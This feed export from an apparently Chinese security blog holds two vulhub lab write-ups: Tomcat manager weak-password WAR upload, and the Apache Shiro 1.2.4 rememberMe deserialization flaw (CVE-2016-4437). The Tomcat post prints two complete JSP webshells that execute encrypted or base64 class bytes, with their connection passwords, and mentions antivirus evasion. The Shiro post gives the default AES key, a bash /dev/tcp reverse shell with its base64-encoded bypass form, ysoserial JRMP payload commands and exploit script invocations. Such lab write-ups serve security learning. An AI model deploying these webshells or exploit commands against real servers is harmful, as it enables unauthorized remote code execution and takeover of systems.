{
    "version": "https://jsonfeed.org/version/1",
    "title": "sqrt7 • All posts by \"vulhub\" category",
    "description": "",
    "home_page_url": "https://w-sqrt7.gitee.io",
    "items": [
        {
            "id": "https://w-sqrt7.gitee.io/2024/04/24/vulhub/%E3%80%90vulhub%E3%80%91Tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/",
            "url": "https://w-sqrt7.gitee.io/2024/04/24/vulhub/%E3%80%90vulhub%E3%80%91Tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/",
            "title": "【vulhub】Tomcat漏洞复现",
            "date_published": "2024-04-24T02:46:27.742Z",
            "content_html": "<h1 id=\"【vulhub】Tomcat漏洞复现\"><a href=\"#【vulhub】Tomcat漏洞复现\" class=\"headerlink\" title=\"【vulhub】Tomcat漏洞复现\"></a>【vulhub】Tomcat漏洞复现</h1><p>​\tTomcat是一个开源的、轻量级的应用服务器，是Apache软件基金会的一个项目。它实现了Java Servlet、JavaServer Pages（JSP）和 Java Expression Language（EL）等Java技术，用于支持在Java平台上运行的动态Web应用程序。Tomcat的全名是Apache Tomcat。</p>\n<p>​\tTomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。Tomcat大都是java代码写的，所以他依赖于java的JDK环境。</p>\n<h1 id=\"Tomcat8\"><a href=\"#Tomcat8\" class=\"headerlink\" title=\"Tomcat8\"></a>Tomcat8</h1><h2 id=\"漏洞原理\"><a href=\"#漏洞原理\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h2><p>Tomcat7+ 弱口令 &amp;&amp; 后台getshell漏洞</p>\n<p>Tomcat版本：8.0</p>\n<p>环境说明</p>\n<p>Tomcat支持在后台部署war文件，可以直接将webshell部署到web目录下。其中，欲访问后台，需要对应用户有相应权限。</p>\n<p>Tomcat7+权限分为：</p>\n<ul>\n<li>manager（后台管理）<ul>\n<li>manager-gui 拥有html页面权限</li>\n<li>manager-status 拥有查看status的权限</li>\n<li>manager-script 拥有text接口的权限，和status权限</li>\n<li>manager-jmx 拥有jmx权限，和status权限</li>\n</ul>\n</li>\n<li>host-manager（虚拟主机管理）<ul>\n<li>admin-gui 拥有html页面权限</li>\n<li>admin-script 拥有text接口权限</li>\n</ul>\n</li>\n</ul>\n<p>​\twar包是用来进行Web开发时一个网站项目下的所有代码,包括前台HTML&#x2F;CSS&#x2F;JS代码,以及后台JavaWeb的代码。 当开发人员开发完毕时,就会将源码打包给测试人员测试,测试完后若要发布则也会打包成War包进行发布。War包 可以放在Tomcat下的webapps或word目录,当Tomcat服务器启动时，War包即会随之解压源代码来进行自动部署。</p>\n<h2 id=\"漏洞复现\"><a href=\"#漏洞复现\" class=\"headerlink\" title=\"漏洞复现\"></a>漏洞复现</h2><p>首先尝试利用弱口令（tomcat:tomcat）登录到后台，登入后台可以发现一个文件上传点，用于上传war包的，以此为基础，文件上传后门木马进行连接</p>\n<p><img src=\"/2024/04/24/vulhub/%E3%80%90vulhub%E3%80%91Tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png\" alt=\"1\"></p>\n<p><img src=\"/2024/04/24/vulhub/%E3%80%90vulhub%E3%80%91Tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/11.png\" alt=\"11\"></p>\n<p>需要准备好恶意代码，要免杀处理后的木马</p>\n<p>如冰蝎可以连接成功的木马（.jsp）（密码rebeyond）（蚁剑无法连接该木马，原因未了解）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;))&#123;String k=&quot;e45e329feb5d925b&quot;;/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;</span><br></pre></td></tr></table></figure>\n\n<p>如蚁剑可以连接成功的木马（.jsp）（密码passwd）（冰蝎无法连接该木马，原因未了解）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%!</span><br><span class=\"line\">    class U extends ClassLoader &#123;</span><br><span class=\"line\">        U(ClassLoader c) &#123;</span><br><span class=\"line\">            super(c);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        public Class g(byte[] b) &#123;</span><br><span class=\"line\">            return super.defineClass(b, 0, b.length);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    public byte[] base64Decode(String str) throws Exception &#123;</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            Class clazz = Class.forName(&quot;sun.misc.BASE64Decoder&quot;);</span><br><span class=\"line\">            return (byte[]) clazz.getMethod(&quot;decodeBuffer&quot;, String.class).invoke(clazz.newInstance(), str);</span><br><span class=\"line\">        &#125; catch (Exception e) &#123;</span><br><span class=\"line\">            Class clazz = Class.forName(&quot;java.util.Base64&quot;);</span><br><span class=\"line\">            Object decoder = clazz.getMethod(&quot;getDecoder&quot;).invoke(null);</span><br><span class=\"line\">            return (byte[]) decoder.getClass().getMethod(&quot;decode&quot;, String.class).invoke(decoder, str);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;</span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    String cls = request.getParameter(&quot;passwd&quot;);</span><br><span class=\"line\">    if (cls != null) &#123;</span><br><span class=\"line\">        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>将木马压缩为.zip文件，然后再将文件后缀更改为.war后进行上传，观察发现上传成功（这里就先上传一个简单的一句话php木马）</p>\n<p><img src=\"/2024/04/24/vulhub/%E3%80%90vulhub%E3%80%91Tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png\" alt=\"2\"></p>\n<p>进入对应目录查看，可以发现刚才上传的一句话木马被处理掉了，也就无法正常进行连接，所以需要进行免杀处理。</p>\n<p><img src=\"/2024/04/24/vulhub/%E3%80%90vulhub%E3%80%91Tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png\" alt=\"3\"></p>\n<p>这次上传蚁剑可以连接的木马进行同上的操作后上传，并尝试连接，发现可以连接成功。</p>\n<p><img src=\"/2024/04/24/vulhub/%E3%80%90vulhub%E3%80%91Tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png\" alt=\"4\"></p>\n<p>同样，也可以上传一个冰蝎可以连接的木马，并尝试连接，发现可以连接成功。</p>\n<p><img src=\"/2024/04/24/vulhub/%E3%80%90vulhub%E3%80%91Tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png\" alt=\"5\"></p>\n",
            "tags": [
                "原创",
                "靶场",
                "vulhub"
            ]
        },
        {
            "id": "https://w-sqrt7.gitee.io/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/",
            "url": "https://w-sqrt7.gitee.io/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/",
            "title": "【vulhub】Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）",
            "date_published": "2024-04-18T15:31:13.077Z",
            "content_html": "<h1 id=\"【vulhub】Apache-Shiro-1-2-4反序列化漏洞（CVE-2016-4437）\"><a href=\"#【vulhub】Apache-Shiro-1-2-4反序列化漏洞（CVE-2016-4437）\" class=\"headerlink\" title=\"【vulhub】Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）\"></a>【vulhub】Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）</h1><p>​\tApache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。</p>\n<p>​\tApache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。</p>\n<h2 id=\"漏洞原理\"><a href=\"#漏洞原理\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h2><p>在反序列化时，没有对其进行过滤，所以如果传入恶意代码将会造成安全问题</p>\n<p><strong>在 1.2.4 版本前，是默认ASE秘钥，Key: kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;，可以直接反序列化执行恶意代码。</strong>而在1.2.4之后，ASE秘钥就不为默认了，需要获取到Key才可以进行渗透，这个密钥也可能会被爆破出来，从而被攻击者利用构造payload。</p>\n<p><code>具体流程</code></p>\n<p>Apache Shiro默认使用CookieRememberMeManager。其是：得到rememberMe的cookie值–&gt;Base64解码–&gt;AES解密–&gt;反序列化。</p>\n<p>如果用户登录时勾选了rememberMe选项。用户的请求数据包中将会在cookie字段多出一段数据，这一段数据包含了用户的身份信息，且是经过加密的。</p>\n<p>加密的过程是：用户信息&#x3D;&gt;序列化&#x3D;&gt;AES加密（密钥key）&#x3D;&gt;base64编码&#x3D;&gt;添加到RememberMe Cookie字段。勾选记住密码之后，下次登录时，服务端会根据客户端请求包中的cookie值进行身份验证，无需登录即可访问。服务端处理cookie的流程：取出请求包中rememberMe的cookie值 &#x3D;&gt; Base64解码&#x3D;&gt;AES解密（密钥key）&#x3D;&gt;反序列化。</p>\n<p>攻击者直接就可以用这个密钥实现上述加密过程，在Cookie字段写入想要服务端执行的恶意代码，最后服务端在对cookie进行解密的时候（反序列化后）就会执行恶意代码。</p>\n<p><img src=\"/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-18%20003118.png\" alt=\"屏幕截图 2024-04-18 003118\"></p>\n<p><code>影响版本</code></p>\n<p>Apache Shiro &lt;&#x3D;1.2.4</p>\n<p><code>shiro特征</code></p>\n<p>首先需要判断登录页面是否使用了shiro框架进行身份验证、授权、密码学和会话管理。</p>\n<p>判断方法：进行登录操作时勾选上remember me（记住密码选项），抓包并观察，请求报文中是否有rememberme 字段，响应报文中是否有Set-cookie:rememberMe&#x3D;deleteMe字段。</p>\n<p>如果登录失败且勾选了remember选项，响应报文中有Set-cookie:rememberMe&#x3D;deleteMe；当登录成功，且勾选了remember选项，其响应报文如下图，还会有rememberMe字段，之后的所有请求中Cookie都会有rememberMe字段。</p>\n<p><img src=\"/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-17%20234618.png\" alt=\"屏幕截图 2024-04-17 234618\"></p>\n<h2 id=\"漏洞验证\"><a href=\"#漏洞验证\" class=\"headerlink\" title=\"漏洞验证\"></a>漏洞验证</h2><p>利用脚本或工具进行验证</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python2 shiro_exploit.py -u http://192.168.100.134:8080</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418163349162.png\" alt=\"image-20240418163349162\"></p>\n<p><img src=\"/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418163332946.png\" alt=\"image-20240418163332946\"></p>\n<p><img src=\"/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418163611522.png\" alt=\"image-20240418163611522\"></p>\n<p>成功获取到AES密钥kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;，说明漏洞存在。</p>\n<p>利用dnslog或collaborator进一步验证</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python2 shiro_exploit.py -t 3 -u 192.168.100.134:8080 -p &quot;ping -c 4 4kp8lyr2idc6mwiqvjbvs6yeh5nvbk.burpcollaborator.net&quot;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418185442068.png\" alt=\"image-20240418185442068\"></p>\n<h2 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h2><p>目标任务：构造cookie获取反弹shell</p>\n<p>nc开启监听，nc -lvvp 6666</p>\n<p><img src=\"/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418170744863.png\" alt=\"image-20240418170744863\"></p>\n<p>构造反弹shell的命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i &gt;&amp; /dev/tcp/192.168.100.131/6666 0&gt;&amp;1</span><br><span class=\"line\">命令中包含重定向 ’ &lt; ’ ’ &gt; ’ 和管道符 ’ | ’ 时，需要进行 base64 编码绕过检测。</span><br><span class=\"line\">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xMzEvNjY2NiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>利用序列化工具ysoserial.jar生成payload，并配置监听功能</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 7777 CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xMzEvNjY2NiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure>\n\n<p>这里相当于在攻击机上启动了一个VPS服务，监听7777端口，然后在这个服务上放了一个反弹shell的payload，并用序列化工具ysoserial指定利用链生成可执行bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.200.131&#x2F;6666 0&gt;&amp;1命令的序列化数据payload。当后面有客户端请求服务时，我们搭建的这个JRMP就会返回这段payload。</p>\n<p><img src=\"/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418183402795.png\" alt=\"image-20240418183402795\"></p>\n<p>如果不配置此项的话，直接连接，会出现如下情况，无法成功获取shell</p>\n<p><img src=\"/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418183458178.png\" alt=\"image-20240418183458178\"></p>\n<p>利用脚本构造出cooikie信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python2 shiro.py 192.168.100.131:7777</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418171624073.png\" alt=\"image-20240418171624073\"></p>\n<p>BP抓包（勾选remember选项），加入将生成的内容加入到cookie中并发送</p>\n<p>注意要将cookie中原有的内容删去，再添加构造的内容作为cookie发送</p>\n<p><img src=\"/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-18%20174103.png\" alt=\"屏幕截图 2024-04-18 174103\"></p>\n<p>然后回到kali发现获取到了shell</p>\n<p><img src=\"/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418174311802.png\" alt=\"image-20240418174311802\"></p>\n<p><img src=\"/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418174424393.png\" alt=\"image-20240418174424393\"></p>\n<p>也可以nc开启监听后，直接进行如下命令（脚本将上面的步骤整合到一起了），同样能够获取shell</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python2 shiro_exploit.py -t 3 -u 192.168.100.134:8080 -p &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xMzEvNjY2NiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418185029472.png\" alt=\"image-20240418185029472\"></p>\n<p>或直接工具进行漏洞利用</p>\n<p><img src=\"/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-18%20223333.png\" alt=\"屏幕截图 2024-04-18 223333\"></p>\n<p><img src=\"/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418231659688.png\" alt=\"image-20240418231659688\"></p>\n<p><img src=\"/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-18%20223718.png\" alt=\"屏幕截图 2024-04-18 223718\"></p>\n<p><img src=\"/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-18%20223753.png\" alt=\"屏幕截图 2024-04-18 223753\"></p>\n<p><strong>过程中遇见的问题以及解决方法</strong></p>\n<p>总体上，就是脚本运行的环境问题，环境不适配导致一系列报错</p>\n<p>首先，需要pyhton2版本，包括pip2，在kali上装pip2可以，先访问网址<a href=\"https://bootstrap.pypa.io/pip/2.7/get-pip.py%EF%BC%8C%E8%8E%B7%E5%8F%96get-pip.py%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%EF%BC%8C%E5%B0%86%E4%B8%8B%E8%BD%BD%E5%A5%BD%E7%9A%84get-pip.py%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E5%88%B0Kali%E4%B8%8A%E3%80%82%E5%9C%A8Kali%E7%BB%88%E7%AB%AF%E4%B8%AD%EF%BC%8C%E4%BD%BF%E7%94%A8python2%E6%89%A7%E8%A1%8Cget-pip.py%E6%96%87%E4%BB%B6%EF%BC%8C%E5%91%BD%E4%BB%A4%E5%A6%82%E4%B8%8B%EF%BC%9Asudo\">https://bootstrap.pypa.io/pip/2.7/get-pip.py，获取get-pip.py文件内容，将下载好的get-pip.py文件传输到Kali上。在Kali终端中，使用python2执行get-pip.py文件，命令如下：sudo</a> python2 get-pip.py即可。运行脚本时报错No module named ‘Crypto’，则运行如下命令：pip2 install pycryptodome，（还有问题可以尝试卸载重装该模块，即pip uninstall与install），然后使用pyhton2运行脚本即可。</p>\n<p>然后就是java的版本过高，工具无法正常使用（需要java8版本），可以参考文章<a href=\"https://blog.csdn.net/huayimy/article/details/130273362\">https://blog.csdn.net/huayimy/article/details/130273362</a></p>\n<p><strong>知识点补充：</strong></p>\n<p>内存马</p>\n<p>普通的木马是写入一个文件去访问,恶意代码是依靠于文件的，执行后就会在内存中被释放掉，但是内存马是依赖于程序本身的动态注册,会在内存中进行一个保存,视为程序的一部分.实现脱离文件后依旧可以运行。</p>\n<p>JRMP</p>\n<p>Java远程方法协议（Java Remote Method Protocol，JRMP），适用于RMI过程中的协议，只有使用这个协议，方法调用双方才能正常进行数据交流。</p>\n<p>RMI</p>\n<p>远程方法调用(Remote Method Invocation)。远程调用服务器上对象的一种接口。能够让在某个java虚拟机上的对象像调用本地对象一样调用另一个java 虚拟机中的对象上的方法。</p>\n<p>参考文章：</p>\n<p><a href=\"https://blog.csdn.net/Bossfrank/article/details/130173880\">https://blog.csdn.net/Bossfrank/article/details/130173880</a></p>\n<p><a href=\"https://www.freebuf.com/articles/web/372862.html\">https://www.freebuf.com/articles/web/372862.html</a></p>\n<p><a href=\"https://blog.csdn.net/qq_44159028/article/details/115290013\">https://blog.csdn.net/qq_44159028/article/details/115290013</a></p>\n<p><a href=\"https://blog.csdn.net/huayimy/article/details/130273362\">https://blog.csdn.net/huayimy/article/details/130273362</a></p>\n<p><a href=\"https://www.freebuf.com/articles/web/379047.html\">https://www.freebuf.com/articles/web/379047.html</a></p>\n<p><a href=\"https://blog.csdn.net/Candyys/article/details/106038761\">https://blog.csdn.net/Candyys/article/details/106038761</a></p>\n<p><a href=\"https://ares-x.com/tools/runtime-exec\">https://ares-x.com/tools/runtime-exec</a></p>\n",
            "tags": [
                "原创",
                "靶场",
                "vulhub"
            ]
        }
    ]
}